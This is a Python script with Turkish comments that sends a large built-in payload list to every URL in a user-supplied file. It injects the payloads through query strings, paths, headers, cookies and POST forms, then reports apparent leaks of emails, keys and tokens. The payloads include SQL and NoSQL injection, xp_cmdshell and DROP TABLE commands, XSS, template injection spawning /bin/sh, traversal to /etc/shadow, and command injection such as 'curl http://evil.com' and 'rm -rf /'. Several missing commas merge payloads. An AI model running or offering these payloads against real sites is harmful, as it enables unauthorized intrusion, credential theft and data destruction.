import re
import time
import asyncio
from aiohttp import ClientSession # type: ignore
from termcolor import colored # type: ignore

# Sızıntı patternleri ve açıklamaları
patterns = {
    'E-posta': r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+',
    'IP Adresi': r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b',
    'Telefon Numarası': r'\b\d{10,12}\b',
    'API Anahtarı': r'(?i)api[_\-]?key[=:]\s*[a-zA-Z0-9]{20,}',
    'JWT Token': r'\beyJ[a-zA-Z0-9-_]+\.[a-zA-Z0-9-_]+\.[a-zA-Z0-9-_]+\b'
}

# Payload'ları kod içinde tanımla
payloads = [
    # SQL Injection payloads
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR 1=1 --",
    "' UNION SELECT NULL, NULL --",
    "' UNION SELECT 1, 'admin', 'password' --",
    "admin' --",
    "' AND '1' = '1'; --",
    "'; DROP TABLE users --",
    "' OR 'x'='x",
    "1' OR '1'='1 --",
    "' UNION SELECT 1, version(), database() --",
    "admin' #",
    "' OR 1=1;--",
    "' AND 1=1 --",
    "OR 1=1",
    "' OR '1'='1",
    "' UNION SELECT ALL FROM information_schema.tables --",
    "' UNION ALL SELECT load_file('/etc/passwd') --",

    # SQL Injection (MySQL, MSSQL, PostgreSQL, Oracle)
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR 1=1 --",
    "' UNION SELECT NULL, NULL --",
    "' UNION SELECT 1, 'admin', 'password' --",
    "' UNION ALL SELECT 1,2,3 --",
    "' UNION SELECT version() --",
    "' UNION SELECT @@version, user() --",
    "' UNION ALL SELECT NULL, load_file('/etc/passwd') --",
    "' AND 1=1 --",
    "' OR 1=1 --",
    "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --",
    "' OR 1=1; --",
    "' UNION SELECT user(),database(),version() --",
    "' UNION ALL SELECT @@hostname, @@datadir --",
    "admin' OR 1=1 --",
    "' UNION ALL SELECT 1, group_concat(table_name) FROM information_schema.tables --",
    "' UNION ALL SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users' --",
    "' OR 1=0 UNION SELECT username, password FROM users --",
    
    # MSSQL Injection (Windows-Based)
    "'; EXEC xp_cmdshell('dir'); --",
    "'; EXEC sp_who; --",
    "'; EXEC sp_helpdb; --",
    "' OR 1=1; EXEC xp_cmdshell('whoami'); --",
    "'; DROP TABLE users; --",
    "' OR '1'='1'; EXEC xp_cmdshell('ipconfig'); --",
    "'; EXEC master.dbo.xp_cmdshell('ping 127.0.0.1'); --",
    
    # PostgreSQL Injection
    "'; SELECT version(); --",
    "'; COPY (SELECT '') TO PROGRAM 'ls'; --",
    "'; DROP DATABASE test; --",
    "'; COPY (SELECT '') TO PROGRAM 'whoami'; --",
    
    # Oracle Injection
    "' OR '1'='1'--",
    "' UNION SELECT NULL, banner FROM v$version--",
    "' UNION SELECT NULL, user FROM dual--",
    "' UNION SELECT NULL, password FROM all_users--",
    
    # MongoDB Injection (NoSQL)
    "{ '$ne': null }",
    "{ '$gt': '' }",
    "{ '$regex': '' }",
    "{ '$where': 'this.password.length > 0' }",
    "{ '$where': 'this.username == \"admin\"' }",
    "{ 'username': { '$ne': null } }",
    "{ 'username': { '$gt': '' } }",
    "{ 'username': { '$in': ['admin'] } }",
    
    # Advanced SQL Bypass
    "'/**/OR/**/1/**/=/**/1--",
    "'+OR+1=1--",
    "'/**/UNION/**/ALL/**/SELECT/**/NULL,NULL--",
    "'+UNION+ALL+SELECT+NULL,NULL--",
    "'/*!50000SELECT*/+1,2--",
    "' OR 1=1 UNION SELECT @@version,@@hostname--",
    "' UNION SELECT CONCAT(username, ':', password) FROM users --",
    "' OR SLEEP(5)--",
    "' OR BENCHMARK(1000000,MD5(1))--",
    "'; WAITFOR DELAY '0:0:5'; --",
    "'+UNION+ALL+SELECT+NULL,table_name+FROM+information_schema.tables--"

     # JavaScript-Based XSS (Universal)
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<body onload=alert(1)>",
    "<input type='text' value='xss' onfocus='alert(1)'>",
    "<div style=\"width:expression(alert(1))\">",
    "<marquee onstart=alert(1)>",
    "<style>body{background:url(javascript:alert(1))}</style>",
    "<img src='x' onerror='alert(1)'/>",
    "<script>alert(document.cookie)</script>",
    
    # XSS with Bypass Techniques (Encoding, Obfuscation)
    "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
    "<scr%00ipt>alert('XSS')</scr%00ipt>",
    "%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
    "%3Csvg%20onload%3Dalert%281%29%3E",
    "%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E",
    "%c0%ae%c0%ae%c0%ae%c0%ae/etc/passwd",
    "%u0027%20OR%20%u00271%u0027=%u00271--",
    "%3Cinput%20type%3Dtext%20onfocus%3Dalert(1)%3E",
    
    # AngularJS XSS
    "{{constructor.constructor('alert(1)')()}}",
    "{{alert(1)}}",
    "{{7*7}}",
    
    # ReactJS XSS
    "{dangerouslySetInnerHTML:{__html:'<img src=x onerror=alert(1)>'}}",
    "onMouseOver={alert('XSS')}",
    
    # Vue.js XSS
    "{{alert(1)}}",
    "{{constructor.constructor('alert(1)')()}}",
    
    # C# ASP.NET XSS
    "<%=alert(1)%>",
    "<% Response.Write(\"<script>alert('XSS')</script>\"); %>",
    "<script runat='server'>Response.Write(\"<script>alert(1)</script>\");</script>",
    
    # Java Server Pages (JSP) XSS
    "<%= \"<script>alert(1)</script>\" %>",
    "<jsp:scriptlet>out.print(\"<script>alert(1)</script>\");</jsp:scriptlet>",
    
    # Python Flask/Django XSS
    "{{''.__class__.__mro__[1].__subclasses__()[407](\"/bin/sh\")}}",
    "{{''.join(chr(114) for i in range(1))}}",
    
    # PHP XSS
    "<?php echo '<script>alert(1)</script>'; ?>",
    "<?php echo htmlentities('<script>alert(1)</script>'); ?>",
    "<iframe src=\"data:text/html,<script>alert(1)</script>\"></iframe>",
    
    # Advanced XSS Bypass Techniques
    "%c0%ae%c0%ae%c0%ae%c0%ae/etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "%u0027+OR+%u00271%u0027=%u00271--",
    "%3CIMG%20SRC=x%20ONERROR=%22alert(1)%22%3E",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;"

    # Path Traversal (Linux/Unix)
    "../../../../../../etc/passwd",
    "../../../../../../etc/shadow",
    "/../../../../../../etc/passwd",
    "/../../../../../../etc/shadow",
    "../../etc/passwd",
    "../../../../../../proc/self/environ",
    "/../../../../../../etc/hosts",
    "../../../../../../etc/group",
    
    # Path Traversal (Windows)
    "../../../../../../windows/system32/drivers/etc/hosts",
    "../../../../../../windows/system32/config/sam",
    "../../../../../../windows/system32/config/system",
    "/../../../../../../windows/system.ini",
    "../../../../../../windows/win.ini",
    
    # Advanced Path Traversal with Encoding
    "%c0%ae%c0%ae%c0%ae%c0%ae/etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow",
    "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
    "%c0%ae%c0%ae%c0%ae%c0%ae%2f%2fwindows%5csystem.ini",
    
    # Path Traversal (PHP Specific)
    "?file=../../../../../../../../etc/passwd",
    "?path=../../../../../../etc/shadow",
    "?file=/etc/passwd%00",
    "?file=../../../../../../proc/self/environ%00",
    
    # Path Traversal (ASP.NET Specific)
    "file=..\\..\\..\\..\\windows\\win.ini",
    "file=..\\..\\..\\..\\web.config",
    "?file=../../../../../../../../Windows/System32/drivers/etc/hosts"
    
    # XSS payloads
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "';alert(String.fromCharCode(88,83,83))//",
    "\" onmouseover=\"alert('XSS')\"",
    "<body onload=alert(1)>",
    "<input type='text' value='xss' onfocus='alert(1)'>",
    "'><script>alert(1)</script>",
    "\";!--\"<XSS>=&{()}",
    "<div style=\"width:expression(alert(1))\">",
    "<marquee onstart=alert(1)>",
    "<style>body{background:url(javascript:alert(1))}</style>",
    "<script>alert(document.cookie)</script>",
    
    # Path Traversal payloads
    "../../../../../../etc/passwd",
    "../../../../../../etc/shadow",
    "/../../../../../../etc/passwd",
    "/../../../../../../etc/shadow",
    "../../etc/passwd",
    "../../../../../../windows/system32/drivers/etc/hosts",
    "../../../../../../proc/self/environ",
    "/../../../../../../etc/hosts",
    "../../../../../../etc/group",
    "../../../../../../etc/mysql/my.cnf",
    "../../../../../../windows/system.ini",
    "../../../../../../windows/win.ini",
    
    # Command Injection payloads
    "; ls -la",
    "| whoami",
    "; id",
    "| netstat -an",
    "&& ls",
    "`id`",
    "`whoami`",
    "| cat /etc/passwd",
    "`cat /etc/shadow`",
    "; echo $(id)",
    "| uname -a",
    "| curl http://evil.com",
    "; curl http://malicious.com",
    "`curl http://malicious.com`",
    "`rm -rf /`",
    "; ping -c 10 127.0.0.1",
    
    # LFI (Local File Inclusion) payloads
    "../../../../../../etc/passwd",
    "../../../../../../windows/system32/drivers/etc/hosts",
    "../../../../../../proc/self/environ",
    "../../../../../../etc/hosts",
    "../../../../../../etc/group",
    "../../../../../../etc/mysql/my.cnf",
    "../../../../../../windows/system.ini",
    "../../../../../../windows/win.ini",
    "../../../../../../proc/self/fd/0",
    "/../../../../../../proc/self/cmdline",
    "/../../../../../../proc/self/fd/1",
    "/../../../../../../proc/self/fd/2",
    
    # Advanced Payloads targeting WAF bypass
    "%27%20OR%20%271%27=%271",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "%2527%2520OR%25201=1--",
    "%25%32%37%20%4F%52%20%27%31%27%3D%27%31",
    "0x27+OR+1=1--",
    "%3CIMG%20SRC=x%20ONERROR=%22alert(1)%22%3E",
    "0x5c%5c127.0.0.1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "../%5c../%5c../%5c../etc/passwd%00",
    "1%00 or 1=1",
    
    # Bypassing common filters with encoding
    "%c0%ae%c0%ae%c0%ae%c0%ae/etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%u0027+OR+%u00271%u0027=%u00271--",
    "%c0%ae%c0%ae/etc/shadow",
    "%c0%ae%c0%ae/proc/self/environ",
    "%2527%2520OR%25201=1--",
    "%2527%2520OR%25201=1%23",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",

    
    
    # Other payloads
    "%u0027%20OR%20%u00271%u0027=%u00271--",
    "%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "%5c%5c%5c%5c%5c%5c/etc/passwd%00",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fproc/self/environ",
    "../../../../../../../../../../etc/shadow",
    "%u0027+UNION+SELECT+NULL,NULL,NULL--"
]

# URL'nin farklı bölümlerine yük ekleme
def inject_payload_in_url(url, payload):
    if '?' in url:
        url_with_payload = url + f"&{payload}=test"
    else:
        url_with_payload = url + f"?{payload}=test"
    url_with_path_payload = url.rstrip('/') + f'/{payload}/'
    return url_with_payload, url_with_path_payload

# Asenkron GET isteği
async def fetch(session, url, headers=None, cookies=None):
    try:
        async with session.get(url, headers=headers, cookies=cookies) as response:
            return await response.text()
    except Exception as e:
        return None

# Asenkron POST isteği
async def post(session, url, data):
    try:
        async with session.post(url, data=data) as response:
            return await response.text()
    except Exception as e:
        return None

# Ana program
async def main():
    file_name = input("Tarama yapılacak txt dosyasını girin: ")
    
    try:
        with open(file_name, "r") as file:
            urls = file.readlines()
        
        start_time = time.time()
        
        async with ClientSession() as session:
            for url in urls:
                url = url.strip()
                
                for payload in payloads:
                    # URL'nin sorgu parametrelerine ve yoluna yük ekleme
                    url_with_query, url_with_path = inject_payload_in_url(url, payload)

                    # GET isteği başlık ve çerezlerle
                    headers = {'User-Agent': 'Mozilla/5.0', 'X-Test-Header': payload}
                    cookies = {'session_id': payload}
                    
                    response = await fetch(session, url_with_query, headers=headers, cookies=cookies)
                    if response:
                        for key, pattern in patterns.items():
                            match = re.search(pattern, response)
                            if match:
                                print(colored(f"[+] Sömürülen URL: {url}", 'green'))
                                print(colored(f"[+] Kullanılan Payload: {payload}", 'green'))
                                print(colored(f"[+] Zafiyet Nerede: {url} üzerindeki 'input' parametresinde", 'green'))
                                print(colored(f"[+] Manuel Test Adımları:", 'green'))
                                print(colored(f"  1. Tarayıcınızdan şu URL'yi ziyaret edin: {url}?{payload}=test", 'green'))
                                print(colored(f"  2. Dönüş response'unu inceleyin.", 'green'))
                                print(colored(f"[+] Zafiyetin Sebebi: Giriş doğrulaması eksik veya yetersiz.", 'green'))
                                print(colored(f"[+] Çözüm Önerisi: Giriş verilerini filtreleyin, özel karakterleri sanitize edin ve WAF kullanarak ek güvenlik önlemleri alın.", 'green'))
                                
                    # Form tabanlı POST isteği ile enjeksiyon
                    data = {'username': payload, 'password': 'test'}
                    response_post = await post(session, url_with_path, data=data)
                    if response_post:
                        for key, pattern in patterns.items():
                            match = re.search(pattern, response_post)
                            if match:
                                print(colored(f"[+] Sömürülen URL: {url}", 'green'))
                                print(colored(f"[+] Kullanılan Payload: {payload}", 'green'))
                                print(colored(f"[+] Zafiyet Nerede: {url} üzerindeki 'input' parametresinde", 'green'))
                                print(colored(f"[+] Manuel Test Adımları:", 'green'))
                                print(colored(f"  1. Tarayıcınızdan şu URL'yi ziyaret edin: {url}/{payload}/", 'green'))
                                print(colored(f"  2. Dönüş response'unu inceleyin.", 'green'))
                                print(colored(f"[+] Zafiyetin Sebebi: Giriş doğrulaması eksik veya yetersiz.", 'green'))
                                print(colored(f"[+] Çözüm Önerisi: Giriş verilerini filtreleyin, özel karakterleri sanitize edin ve WAF kullanarak ek güvenlik önlemleri alın.", 'green'))
        
        elapsed_time = time.time() - start_time
        print(f"Tarama tamamlandı. Geçen süre: {elapsed_time:.2f} saniye")
    
    except FileNotFoundError:
        print("Dosya bulunamadı.")
    except Exception as e:
        print(f"Bir hata oluştu: {e}")

if __name__ == "__main__":
    asyncio.run(main())
